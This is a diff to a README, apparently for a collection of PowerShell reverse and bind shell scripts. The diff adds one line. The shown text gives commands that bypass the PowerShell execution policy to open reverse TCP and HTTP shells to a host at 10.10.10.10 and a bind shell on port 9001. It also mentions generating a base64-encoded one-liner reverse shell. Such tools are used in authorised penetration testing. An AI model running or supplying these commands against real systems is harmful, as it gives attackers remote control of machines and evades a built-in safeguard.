@@ -6,6 +6,7 @@ If the system allows it you might be able to just execute the scripts with the r
 ```
 powershell.exe -ExecutionPolicy ByPass "&.\reverse_tcp.ps1 -server 10.10.10.10 -port 9001"
 powershell.exe -ExecutionPolicy ByPass "&.\bind_tcp.ps1 -port 9001"
+powershell.exe -ExecutionPolicy ByPass "&.\reverse_http.ps1 -server 10.10.10.10 -port 8080"
 ```
 If you are unable to bypass the execution policy, or it is easier for you to just execute a one-liner (unable or hard to download/execute scripts) then you can use the generate_encoded_reverse_tcp.ps1 script to generate a powershell one-liner version of the reverse_tcp.ps1 script. This will generate a single line line of base64 encoded powershell.
 
